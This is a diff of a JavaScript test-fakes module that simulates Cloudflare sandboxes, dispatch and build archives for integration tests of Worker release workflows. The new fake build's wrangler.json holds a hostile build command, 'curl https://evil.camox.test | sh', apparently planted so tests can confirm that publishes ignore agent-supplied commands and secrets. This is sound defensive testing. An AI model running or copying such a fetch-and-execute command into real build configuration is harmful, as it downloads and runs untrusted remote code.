@@ -1,11 +1,25 @@
 // Fakes for the release, creation, deletion and upgrade Workflows' Cloudflare Artifacts, sandbox
 // and email bindings, the revision sandboxes the agent's builds run in, and the Cloudflare API
 // they call, run by the integration tests as an auxiliary Worker (vite.config.ts), which bundles
-// it with the fake Git server its repos' remotes are served by (fake-git-server.ts). Everything
+// it with the fake Git server its repos' remotes are served by (fake-git-server.ts) and the fake
+// Cloudflare API (fake-cloudflare-api.ts). Everything
 // shares one isolate, so the fakes and the tests that drive them through `ReleaseFakes` share
 // this module's state, keyed by repo name.
 import { DurableObject, RpcTarget, WorkerEntrypoint } from "cloudflare:workers";
 
+import { tar, untarGzip } from "../src/lib/tar";
+import {
+  cloudflareCalls,
+  deployUserWorker,
+  failCloudflareCalls,
+  failDeletionsOf,
+  holdCloudflareCalls,
+  letGoCloudflareCalls,
+  order,
+  serveCloudflareApi,
+  userWorker,
+  userWorkersOf,
+} from "./fake-cloudflare-api";
 import {
   FAKE_GIT_HOST,
   commitFiles,
@@ -33,8 +47,6 @@ const repos = new Map();
 const mains = new Map();
 /** @type {Map<string, { command: string, env: Record<string, string>, order: number }[]>} repo name → commands */
 const commandsRun = new Map();
-/** Counts every command run, in any repo, so tests can order commands across repos. */
-let commandsRunCount = 0;
 /** @type {Map<string, { pattern: string, times: number }[]>} repo name → commands that fail */
 const failures = new Map();
 /** @type {Map<string, string>} repo name → a command that waits until the test lets it go */
@@ -49,46 +61,6 @@ const forksRunning = new Map();
 const lostForkResponses = new Set();
 /** @type {Set<string>} repos every fork of fails */
 const failingForks = new Set();
-/** @type {Set<string>} the user Workers in the `production` dispatch namespace */
-const userWorkers = new Set();
-/** @type {Set<string>} user Workers every deletion of fails */
-const failingWorkerDeletions = new Set();
-
-/** The Cloudflare API token and account the API is given in tests (vite.config.ts). */
-const CLOUDFLARE_API_TOKEN = "test-cloudflare-token";
-const CLOUDFLARE_ACCOUNT_ID = "0123456789abcdef0123456789abcdef";
-// Deleting a user Worker from a dispatch namespace, through the Cloudflare API.
-const DISPATCH_SCRIPT =
-  /^\/client\/v4\/accounts\/([^/]+)\/workers\/dispatch\/namespaces\/([^/]+)\/scripts\/([^/]+)$/;
-
-/**
- * The part of the Cloudflare API the Workflows call with Camox's token: deleting a user Worker
- * from the `production` dispatch namespace. Answers as Cloudflare does, with a JSON envelope.
- * @param {Request} request
- */
-function serveCloudflareApi(request) {
-  const envelope = (status, errors = []) =>
-    Response.json({ success: status < 400, errors, messages: [], result: null }, { status });
-  if (request.headers.get("authorization") !== `Bearer ${CLOUDFLARE_API_TOKEN}`) {
-    return envelope(403, [{ code: 10000, message: "Authentication error" }]);
-  }
-  const match = DISPATCH_SCRIPT.exec(new URL(request.url).pathname);
-  if (request.method !== "DELETE" || !match) {
-    return envelope(404, [{ code: 7003, message: "No route for that URI" }]);
-  }
-  const [, account, namespace, name] = match;
-  if (account !== CLOUDFLARE_ACCOUNT_ID || namespace !== "production") {
-    return envelope(403, [{ code: 10000, message: "Authentication error" }]);
-  }
-  if (failingWorkerDeletions.has(name)) {
-    return envelope(500, [{ code: 10013, message: "An unknown error has occurred" }]);
-  }
-  if (!userWorkers.delete(name)) {
-    return envelope(404, [{ code: 10007, message: "This Worker does not exist on your account." }]);
-  }
-  return envelope(200);
-}
-
 /**
  * An error the way the Artifacts binding's errors reach a Worker in production: `code` is in
  * neither the error nor its message (`ArtifactsError: repo already exists: <name>`), so it
@@ -264,7 +236,7 @@ export class FakeSandbox extends DurableObject {
     const command = WRAPPED.exec(wrapped)?.[1] ?? wrapped;
     const repo = this.repo ?? "";
     const run = commandsRun.get(repo) ?? [];
-    run.push({ command, env: { ...options.env }, order: commandsRunCount++ });
+    run.push({ command, env: { ...options.env }, order: order() });
     commandsRun.set(repo, run);
 
     const failure = failures.get(repo)?.find(({ pattern, times }) => {
@@ -272,9 +244,9 @@ export class FakeSandbox extends DurableObject {
     });
     if (failure) failure.times -= 1;
     const exitCode = failure ? 1 : 0;
-    // A release's deploy makes a new version of the project's Worker serve.
+    // A release's deploy replaces the project's Worker, named after its Project ID.
     if (exitCode === 0 && /\bwrangler deploy\b/.test(command)) {
-      serveVersion(repo, uploadVersion(repo, { build: `release of ${repo}`, vars: {} }));
+      deployUserWorker(repo, `release of ${repo}`);
     }
     const waits = () => {
       const pattern = held.get(repo);
@@ -389,7 +361,7 @@ async function bytesOf(/** @type {string | ReadableStream<Uint8Array>} */ conten
   return new Uint8Array(await new Response(content).arrayBuffer());
 }
 
-/** @type {Map<string, { sandbox: string, files: Record<string, string>, archive: number[] | null }[]>} sandbox → builds */
+/** @type {Map<string, { sandbox: string, files: Record<string, string>, archive: number[] | null, build?: string }[]>} sandbox → builds */
 const revisionBuilds = new Map();
 /** @type {Map<string, { command: string, env: Record<string, string> | undefined }[]>} sandbox → commands */
 const revisionCommands = new Map();
@@ -397,6 +369,8 @@ const revisionCommands = new Map();
 const failingBuilds = [];
 /** @type {{ marker: string, definitionSet: unknown }[]} builds of a tree with a file holding `marker` have that Definition Set */
 const definedBuilds = [];
+/** @type {{ marker: string, config: Record<string, unknown> }[]} builds of a tree with a file holding `marker` have that in their `wrangler.json` */
+const configuredBuilds = [];
 /**
  * @typedef {{ file: string, line: number, column: number, code: string, message: string }} FakeTypeError
  * @type {{ marker: string, errors: FakeTypeError[] }[]} type checks of a tree with a file holding `marker` report `errors`
@@ -633,14 +607,10 @@ export class FakeRevisionSandbox extends DurableObject {
     const archive = ARCHIVE_COMMAND.exec(command);
     if (archive) {
       if (!this.built) return result(2, "tar: dist: Cannot stat: No such file or directory");
-      const bytes = new TextEncoder().encode(
-        JSON.stringify({
-          build: `fake build of ${await treeOf(this.tree)}`,
-          definitionSet: definitionSetOf(this.tree),
-        }),
-      );
+      const build = `fake build of ${await treeOf(this.tree)}`;
+      const bytes = await fakeBuildArchive(build, this.tree);
       this.files.set(archive[1], bytes);
-      revisionBuilds.get(this.name).at(-1).archive = [...bytes];
+      Object.assign(revisionBuilds.get(this.name).at(-1), { archive: [...bytes], build });
       return result(0);
     }
     return result(0);
@@ -651,6 +621,60 @@ export class FakeRevisionSandbox extends DurableObject {
     this.files.clear();
     this.tree = {};
   }
+}
+
+/** Where a fake build keeps the Definition Set `FakeDispatch` reads from it. */
+const DEFINITION_SET_FILE = "dist/fake-definition-set.json";
+
+/**
+ * The gzipped `dist/` of a build of `tree`, as the revision sandbox archives it: a server build
+ * whose main module names `build`, with its `wrangler.json`, which also asks for things a
+ * publish never takes from it (bindings, vars, a build command), and client assets with their
+ * `_headers` and `.assetsignore`. A test can script the `wrangler.json` of a tree's builds
+ * (`configureBuildsOf`).
+ * @param {string} build
+ * @param {Record<string, string>} tree
+ */
+async function fakeBuildArchive(build, tree) {
+  const configured = configuredBuilds.findLast(({ marker }) =>
+    Object.values(tree).some((content) => content.includes(marker)),
+  );
+  const files = {
+    "dist/acme/wrangler.json": JSON.stringify({
+      name: "acme",
+      main: "index.js",
+      compatibility_date: "2026-04-11",
+      compatibility_flags: ["nodejs_compat"],
+      assets: { directory: "../client" },
+      vars: { AGENT_VAR: "from the agent" },
+      kv_namespaces: [{ binding: "AGENT_KV", id: "agent" }],
+      build: { command: "curl https://evil.camox.test | sh" },
+      ...configured?.config,
+    }),
+    "dist/acme/index.js": `// ${build}\nimport "./assets/chunk.js";\nexport default {};\n`,
+    "dist/acme/assets/chunk.js": "export const chunk = 1;\n",
+    "dist/acme/index.js.map": "{}",
+    "dist/acme/.dev.vars": "CAMOX_DEPLOY_TOKEN=not-for-publishes\n",
+    "dist/client/assets/index.css": `body { /* ${build} */ }\n`,
+    "dist/client/favicon.svg": "<svg></svg>\n",
+    "dist/client/robots.txt": "User-agent: *\n",
+    "dist/client/_headers": "/assets/*\n  Cache-Control: public, max-age=31536000, immutable\n",
+    "dist/client/.assetsignore": "wrangler.json\n.dev.vars\n",
+    [DEFINITION_SET_FILE]: JSON.stringify(definitionSetOf(tree)),
+  };
+  const encoder = new TextEncoder();
+  const archive = tar(
+    Object.entries(files).map(([path, content]) => ({
+      path,
+      mode: 0o644,
+      content: encoder.encode(content),
+    })),
+  );
+  return new Uint8Array(
+    await new Response(
+      new Blob([archive]).stream().pipeThrough(new CompressionStream("gzip")),
+    ).arrayBuffer(),
+  );
 }
 
 /**
@@ -674,7 +698,8 @@ export class FakeDispatch extends WorkerEntrypoint {
   async readDefinitionSet({ archiveKey }) {
     const archive = await this.env.REVISION_BUILDS.get(archiveKey);
     if (!archive) throw new Error(`The build ${archiveKey} isn't stored`);
-    return JSON.parse(await archive.text()).definitionSet;
+    const files = await untarGzip(archive.body);
+    return JSON.parse(new TextDecoder().decode(files.get(DEFINITION_SET_FILE)));
   }
 
   /** @param {{ revision: string, archiveKey: string, project: string, draft: string }} revision */
@@ -693,158 +718,6 @@ export class FakeDispatch extends WorkerEntrypoint {
       "body {}",
     );
     prewarmed.push(revision);
-  }
-}
-
-/** @typedef {{ id: string, build: string, vars: Record<string, string> }} WorkerVersion */
-/** @type {Map<string, WorkerVersion[]>} project → its Worker's versions, oldest first */
-const workerVersions = new Map();
-/** @type {Map<string, string[]>} project → the versions that served all its traffic, in order */
-const deployments = new Map();
-/** @type {Map<string, { command: string, env: Record<string, string> | undefined, order: number }[]>} project → publish sandbox commands */
-const publishCommands = new Map();
-/**
- * @type {{ project: string, pattern: string, times: number, landing?: boolean }[]} publish sandbox
- * commands that fail, before doing anything, or after, as when their answer is lost (`landing`)
- */
-const failingPublishCommands = [];
-/** @type {{ project: string, pattern: string }[]} publish sandbox commands held until the test lets them go */
-let heldPublishCommands = [];
-
-/**
- * Adds a version to a project's Worker, as an upload does, and returns its ID.
- * @param {string} project
- * @param {{ build: string, vars: Record<string, string> }} version
- */
-function uploadVersion(project, { build, vars }) {
-  const id = crypto.randomUUID();
-  workerVersions.set(project, [...(workerVersions.get(project) ?? []), { id, build, vars }]);
-  return id;
-}
-
-/**
- * @param {string} project
- * @param {string} version
- */
-function serveVersion(project, version) {
-  deployments.set(project, [...(deployments.get(project) ?? []), version]);
-}
-
-/** @param {string} project The version serving the project's Worker, if any. */
-function servedVersionOf(project) {
-  const id = deployments.get(project)?.at(-1);
-  return workerVersions.get(project)?.find((version) => version.id === id) ?? null;
-}
-
-const WRANGLER_NAME = /--name (\S+)/;
-const WRANGLER_VAR = /--var (\S+?):(\S+)/g;
-const VERSIONS_DEPLOY = /\bwrangler versions deploy ([0-9a-f-]+)@100%/;
-const UNPACK_COMMAND = /\btar -xzf (\S+) /;
-
-/**
- * The sandbox a publish with code uploads and promotes the project's Worker in, as
- * `@cloudflare/sandbox`'s `getSandbox` drives it over RPC. It runs no wrangler: it records each
- * command, and `versions upload` adds a version of the build it unpacked (the fake archive the
- * revision sandbox wrote) to the project's Worker, which `versions deploy` serves. Any command
- * can be made to fail, or to wait until the test lets it go.
- */
-export class FakePublishSandbox extends DurableObject {
-  /** @type {string} */
-  name = "";
-  /** @type {Map<string, Uint8Array>} */
-  files = new Map();
-  /** @type {string | null} the build last unpacked */
-  build = null;
-
-  async configure(configuration) {
-    this.name = configuration.sandboxName?.name ?? this.name;
-  }
-
-  async writeFile(path, content, options = {}) {
-    this.files.set(path, await bytesOf(content, options.encoding));
-    return { success: true, path, timestamp: new Date().toISOString() };
-  }
-
-  /**
-   * @param {string} command
-   * @param {{ env?: Record<string, string> }} options
-   */
-  async exec(command, options = {}) {
-    const commands = publishCommands.get(this.name) ?? [];
-    commands.push({ command, env: options.env, order: commandsRunCount++ });
-    publishCommands.set(this.name, commands);
-    const result = (exitCode, stdout = "", stderr = "") => ({
-      success: exitCode === 0,
-      exitCode,
-      stdout,
-      stderr,
-      command,
-      duration: 0,
-      timestamp: "",
-    });
-    // Polled: a promise resolved from the request letting go wouldn't wake this one.
-    const held = () =>
-      heldPublishCommands.some(
-        ({ project, pattern }) => project === this.name && command.includes(pattern),
-      );
-    while (held()) {
-      await new Promise((resolve) => setTimeout(resolve, 10));
-    }
-    const failure = failingPublishCommands.find(
-      ({ project, pattern, times }) =>
-        project === this.name && times > 0 && command.includes(pattern),
-    );
-    if (failure) {
-      failure.times -= 1;
-      if (failure.landing) await this.run(command, result);
-      return result(1, "", `✘ [ERROR] A request to the Cloudflare API failed.`);
-    }
-    return this.run(command, result);
-  }
-
-  /**
-   * Does what `command` does.
-   * @param {string} command
-   * @param {(exitCode: number, stdout?: string, stderr?: string) => unknown} result
-   */
-  async run(command, result) {
-    const unpack = UNPACK_COMMAND.exec(command);
-    if (unpack) {
-      const archive = this.files.get(unpack[1]);
-      if (!archive) return result(2, "", `tar: ${unpack[1]}: Cannot open`);
-      this.build = JSON.parse(new TextDecoder().decode(archive)).build;
-      return result(0);
-    }
-    const project = WRANGLER_NAME.exec(command)?.[1] ?? this.name;
-    if (/\bwrangler versions upload\b/.test(command)) {
-      if (!this.build) return result(1, "", "✘ [ERROR] Missing entry-point");
-      const vars = Object.fromEntries(
-        [...command.matchAll(WRANGLER_VAR)].map(([, k, v]) => [k, v]),
-      );
-      const id = uploadVersion(project, { build: this.build, vars });
-      return result(0, `Uploaded ${project}\nWorker Version ID: ${id}\n`);
-    }
-    if (/\bwrangler deployments status\b/.test(command)) {
-      const served = servedVersionOf(project);
-      return result(
-        0,
-        JSON.stringify({ versions: served ? [{ version_id: served.id, percentage: 100 }] : [] }),
-      );
-    }
-    const deploy = VERSIONS_DEPLOY.exec(command);
-    if (deploy) {
-      if (!workerVersions.get(project)?.some(({ id }) => id === deploy[1])) {
-        return result(1, "", `✘ [ERROR] Version ${deploy[1]} not found`);
-      }
-      serveVersion(project, deploy[1]);
-      return result(0, `Deployed ${project} version ${deploy[1]} at 100%\n`);
-    }
-    return result(0);
-  }
-
-  async destroy() {
-    this.files.clear();
-    this.build = null;
   }
 }
 
@@ -1145,80 +1018,73 @@ export class ReleaseFakes extends WorkerEntrypoint {
     return sandboxSleepAfter.get(sandbox);
   }
 
-  /** @param {string} project The version serving the project's Worker, with its build and vars. */
-  async servedVersion(project) {
-    return servedVersionOf(project);
+  /** @param {string} name A user Worker of the `production` dispatch namespace, as uploaded. */
+  async userWorker(name) {
+    return userWorker(name);
   }
 
-  /** @param {string} project Every version of the project's Worker, oldest first. */
-  async workerVersions(project) {
-    return workerVersions.get(project) ?? [];
+  /** @param {string} project The names of the project's user Workers. */
+  async userWorkersOf(project) {
+    return userWorkersOf(project);
   }
 
-  /** @param {string} project The versions that served all the project's traffic, in order. */
-  async deployments(project) {
-    return deployments.get(project) ?? [];
-  }
-
-  /** @param {string} project The commands a project's publish sandbox ran, oldest first. */
-  async publishCommands(project) {
-    return publishCommands.get(project) ?? [];
+  /** @param {string} project The project's calls to the Cloudflare API, oldest first. */
+  async cloudflareCalls(project) {
+    return cloudflareCalls(project);
   }
 
   /**
-   * Makes the next `times` commands containing `pattern` in a project's publish sandbox fail.
+   * Makes the next `times` calls of a project to the Cloudflare API containing `pattern` fail,
+   * before doing anything, or after, as when their answer is lost (`landing`).
    * @param {string} project
    * @param {string} pattern
    * @param {number} times
+   * @param {boolean} [landing]
    */
-  async failPublishCommand(project, pattern, times) {
-    failingPublishCommands.push({ project, pattern, times });
+  async failCloudflareCalls(project, pattern, times, landing = false) {
+    failCloudflareCalls(project, pattern, times, landing);
   }
 
   /**
-   * Makes the next `times` commands containing `pattern` in a project's publish sandbox do what
-   * they do, then fail, as when their answer is lost.
-   * @param {string} project
-   * @param {string} pattern
-   * @param {number} times
-   */
-  async losePublishCommandAnswers(project, pattern, times) {
-    failingPublishCommands.push({ project, pattern, times, landing: true });
-  }
-
-  /**
-   * Makes commands containing `pattern` in a project's publish sandbox wait until
-   * `letGoPublishCommand`.
+   * Makes a project's calls to the Cloudflare API containing `pattern` wait until
+   * `letGoCloudflareCalls`.
    * @param {string} project
    * @param {string} pattern
    */
-  async holdPublishCommand(project, pattern) {
-    heldPublishCommands.push({ project, pattern });
+  async holdCloudflareCalls(project, pattern) {
+    holdCloudflareCalls(project, pattern);
   }
 
   /**
    * @param {string} project
    * @param {string} pattern
    */
-  async letGoPublishCommand(project, pattern) {
-    heldPublishCommands = heldPublishCommands.filter(
-      (held) => held.project !== project || held.pattern !== pattern,
-    );
+  async letGoCloudflareCalls(project, pattern) {
+    letGoCloudflareCalls(project, pattern);
   }
 
   /** @param {string} name Deploys a user Worker into the `production` dispatch namespace. */
-  async deployWorker(name) {
-    userWorkers.add(name);
+  async deployWorker(name, tags = []) {
+    deployUserWorker(name, `release of ${name}`, tags);
   }
 
   /** @param {string} name Whether the `production` dispatch namespace has that user Worker. */
   async hasWorker(name) {
-    return userWorkers.has(name);
+    return userWorker(name) !== null;
   }
 
   /** @param {string} name Makes every deletion of that user Worker fail. */
   async failWorkerDeletions(name) {
-    failingWorkerDeletions.add(name);
+    failDeletionsOf(name);
+  }
+
+  /**
+   * Gives the builds of a tree with a file holding `marker` a `wrangler.json` with `config` in it.
+   * @param {string} marker
+   * @param {Record<string, unknown>} config
+   */
+  async configureBuildsOf(marker, config) {
+    configuredBuilds.push({ marker, config });
   }
 
   /**
